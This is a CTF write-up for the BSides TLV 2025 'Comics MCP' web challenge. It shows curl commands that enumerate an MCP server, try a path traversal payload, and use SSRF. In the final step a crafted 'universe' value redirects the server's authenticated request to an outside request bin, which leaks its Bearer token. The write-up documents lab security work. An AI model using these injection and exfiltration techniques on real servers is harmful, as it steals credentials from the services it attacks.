# Comics MCP

 * Category: Web
 * Solved by the JCTF Team

## Description

> Welcome to Comics MCP, the Model Context Protocol gateway wired into our utterly classified comics-character database. Query heroes, villains, antiheroes, sidekicks, and anyone else brave enough to survive questionable spandex choices.
> 
> Our MCP server hums with top-secret power, fueled by applications we are not legally allowed to discuss. Ask for character info... but know, sometimes the universe is looking back at you 👀

## Solution

We get the address of an MCP server and can try to talk to it:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl -H "Accept: application/json" https://bstlv25-comics-mcp-server.chals.io/mcp
{"jsonrpc":"2.0","id":"server-error","error":{"code":-32600,"message":"Not Acceptable: Client must accept text/event-stream"}}                                                     
┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl -H "Accept: application/json, text/event-stream" https://bstlv25-comics-mcp-server.chals.io/mcp
{"jsonrpc":"2.0","id":"server-error","error":{"code":-32600,"message":"Bad Request: Missing session ID"}}                                                                          
┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl -i -H "Accept: application/json, text/event-stream" https://bstlv25-comics-mcp-server.chals.io/mcp
HTTP/1.1 400 Bad Request
date: Tue, 09 Dec 2025 11:59:24 GMT
server: uvicorn
content-type: application/json
mcp-session-id: 8bf08d6b825547c99843cdeb9d29c706
content-length: 105

{"jsonrpc":"2.0","id":"server-error","error":{"code":-32600,"message":"Bad Request: Missing session ID"}}                                                                          
┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl -H "MCP-Session-Id: 8bf08d6b825547c99843cdeb9d29c706" -H "Accept: application/json, text/event-stream" https://bstlv25-comics-mcp-server.chals.io/mcp
: ping - 2025-12-09 12:00:09.469645+00:00

┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl \
  -X POST https://bstlv25-comics-mcp-server.chals.io/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "MCP-Session-Id: 8bf08d6b825547c99843cdeb9d29c706" \
  -d '{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "initialize",
    "params": {
      "protocolVersion": "2024-02-15",
      "clientInfo": {
        "name": "ctf-client",
        "version": "1.0.0"
      },
      "capabilities": {}
    }
  }'
event: message
data: {"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2025-06-18","capabilities":{"experimental":{},"prompts":{"listChanged":true},"resources":{"subscribe":false,"listChanged":true},"tools":{"listChanged":true}},"serverInfo":{"name":"Comics MCP Server","version":"2.13.1"}}}
```

We have contact. Let's query its capabilities:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl \
  -X POST https://bstlv25-comics-mcp-server.chals.io/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "MCP-Session-Id: 8bf08d6b825547c99843cdeb9d29c706" \
  -d '{
    "jsonrpc": "2.0",
    "id": 2,
    "method": "prompts/list",
    "params": {}
  }'
event: message
data: {"jsonrpc":"2.0","id":2,"result":{"prompts":[]}}


┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl \
  -X POST https://bstlv25-comics-mcp-server.chals.io/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "MCP-Session-Id: 8bf08d6b825547c99843cdeb9d29c706" \
  -d '{
    "jsonrpc": "2.0",
    "id": 2,
    "method": "resources/list",
    "params": {}
  }'
event: message
data: {"jsonrpc":"2.0","id":2,"result":{"resources":[]}}

┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl \
  -X POST https://bstlv25-comics-mcp-server.chals.io/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "MCP-Session-Id: 8bf08d6b825547c99843cdeb9d29c706" \
  -d '{
    "jsonrpc": "2.0",
    "id": 2,
    "method": "tools/list",
    "params": {}
  }'
event: message
data: {"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"get_character","description":"Get character information from the comics universe","inputSchema":{"properties":{"universe":{"type":"string"},"name":{"type":"string"}},"required":["universe","name"],"type":"object"},"outputSchema":{"additionalProperties":true,"type":"object"},"_meta":{"_fastmcp":{"tags":[]}}}]}}
```

No prompts or resources here, but we seem to have a tool called `get_character`.

Let's start playing with it:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl \
  -X POST https://bstlv25-comics-mcp-server.chals.io/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "MCP-Session-Id: 8bf08d6b825547c99843cdeb9d29c706" \
  -d '{
  "jsonrpc":"2.0",
  "id": 7,
  "method":"tools/call",
  "params": {
    "name":"get_character",
    "arguments": {
      "universe": "test",
      "name": "test"
    }
  }
}'
event: message
data: {"jsonrpc":"2.0","id":7,"result":{"content":[{"type":"text","text":"{\"error\":\"Error fetching data from remote inventory. Message: $('Connection aborted.', BadStatusLine(\\\"Couldn't find underlying service\\\\n\\\"))\",\"status\":500}"}],"structuredContent":{"error":"Error fetching data from remote inventory. Message: $('Connection aborted.', BadStatusLine(\"Couldn't find underlying service\\n\"))","status":500},"isError":false}}
```

That didn't seem to work, but what if we provide a `universe` and `name` which make more sense
in the context of the CTF theme?

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl \
  -X POST https://bstlv25-comics-mcp-server.chals.io/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "MCP-Session-Id: 8bf08d6b825547c99843cdeb9d29c706" \
  -d '{
  "jsonrpc":"2.0",
  "id": 7,
  "method":"tools/call",
  "params": {
    "name":"get_character",
    "arguments": {
      "universe": "marvel",
      "name": "spiderman"
    }
  }
}'
event: message
data: {"jsonrpc":"2.0","id":7,"result":{"content":[{"type":"text","text":"{\"fullName\":\"Peter Parker\",\"movieOrBook\":\"Spider-Man: Homecoming\",\"type\":\"movie\",\"parent\":[\"Richard Parker\",\"Mary Parker\"],\"animalType\":\"Human\",\"powers\":[\"Wall-crawling\",\"Super strength\",\"Spider-sense\"],\"firstAppearance\":\"1962-08-01\",\"occupation\":\"Superhero, Photographer\",\"gender\":\"Male\",\"species\":\"Human mutate\"}"}],"structuredContent":{"fullName":"Peter Parker","movieOrBook":"Spider-Man: Homecoming","type":"movie","parent":["Richard Parker","Mary Parker"],"animalType":"Human","powers":["Wall-crawling","Super strength","Spider-sense"],"firstAppearance":"1962-08-01","occupation":"Superhero, Photographer","gender":"Male","species":"Human mutate"},"isError":false}}
```

So it looks like we can query the "Marvel" universe for characters. The first thing we did
was get a list of all known Marvel characters and query each of them, to see if the flag
is hidden somewhere in the response. However, the flag was nowhere to be found.

The next step, in this case, is to try and break the API and somehow trigger an interesting
error. Something like this:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl \
  -X POST https://bstlv25-comics-mcp-server.chals.io/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "MCP-Session-Id: 8bf08d6b825547c99843cdeb9d29c706" \
  -d '{
  "jsonrpc":"2.0",
  "id": 7,
  "method":"tools/call",
  "params": {
    "name":"get_character",
    "arguments": {
      "universe": "marvel",
      "name": "../../../../etc/passwd"
    }
  }
}'
event: message
data: {"jsonrpc":"2.0","id":7,"result":{"content":[{"type":"text","text":"{\"error\":\"<!DOCTYPE html>\\n<html lang=\\\"en\\\">\\n<head>\\n<meta charset=\\\"utf-8\\\">\\n<title>Error</title>\\n</head>\\n<body>\\n<pre>Cannot GET /etc/passwd</pre>\\n</body>\\n</html>\\n\",\"status\":404}"}],"structuredContent":{"error":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /etc/passwd</pre>\n</body>\n</html>\n","status":404},"isError":false}}
```

That's interesting, we get a 404 error for the file path we've provided. Is there some web-based
logic involved here?

```console
──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl \
  -X POST https://bstlv25-comics-mcp-server.chals.io/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "MCP-Session-Id: 8bf08d6b825547c99843cdeb9d29c706" \
  -d '{
  "jsonrpc":"2.0",
  "id": 7,
  "method":"tools/call",
  "params": {
    "name":"get_character",
    "arguments": {
      "universe": "127.0.0.1",
      "name": "spiderman"
    }
  }
}'
event: message
data: {"jsonrpc":"2.0","id":7,"result":{"content":[{"type":"text","text":"{\"error\":\"Error fetching data from remote inventory. Message: $HTTPSConnectionPool(host='bstlv25-127.0.0.1.chals.io', port=443): Max retries exceeded with url: /spiderman (Caused by SSLError(SSLCertVerificationError(1, \\\"[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'bstlv25-127.0.0.1.chals.io'. (_ssl.c:1010)\\\")))\",\"status\":500}"}],"structuredContent":{"error":"Error fetching data from remote inventory. Message: $HTTPSConnectionPool(host='bstlv25-127.0.0.1.chals.io', port=443): Max retries exceeded with url: /spiderman (Caused by SSLError(SSLCertVerificationError(1, \"[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'bstlv25-127.0.0.1.chals.io'. (_ssl.c:1010)\")))","status":500},"isError":false}}
```

By providing `127.0.0.1` we get a different error message. We learn that the application
is trying to access `bstlv25-<universe>.chals.io/<name>`.

Let's try to access the URL we discovered earlier:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl https://bstlv25-marvel.chals.io/spiderman
{"message":"Authorization header missing"}
```

We're almost there, we just need the authorization header. Technically we can leak it
from the MCP using a *request bin*:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Comics_MCP]
└─$ curl \
  -X POST https://bstlv25-comics-mcp-server.chals.io/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "MCP-Session-Id: 8bf08d6b825547c99843cdeb9d29c706" \
  -d '{
  "jsonrpc":"2.0",
  "id": 7,
  "method":"tools/call",
  "params": {
    "name":"get_character",
    "arguments": {
      "universe": "@jctf2.free.beeceptor.com?",
      "name": "test"
    }
  }
}'
event: message
data: {"jsonrpc":"2.0","id":7,"result":{"content":[{"type":"text","text":"{\"error\":\"Error fetching data from remote inventory. Message: $Expecting value: line 1 column 1 (char 0)\",\"status\":500}"}],"structuredContent":{"error":"Error fetching data from remote inventory. Message: $Expecting value: line 1 column 1 (char 0)","status":500},"isError":false}}
```

The `universe` we used causes the application to send the request to `bstlv25-@jctf2.free.beeceptor.com?.chals.io` which
gets interpreted as `username@server?query`. So, if we use the server to log the request it receives, we will get
the request headers.

In our case, they included the flag:

```
{
  "user-agent": "python-requests/2.32.5",
  "accept": "*/*",
  "accept-encoding": "gzip, deflate",
  "authorization": "Bearer BSidesTLV2025{MCP--G47ew4y_70_7h3_Unkn0wn}",
  "x-forwarded-for": "167.71.162.76",
  "x-forwarded-host": "jctf2.free.beeceptor.com",
  "x-forwarded-proto": "http"
}
```
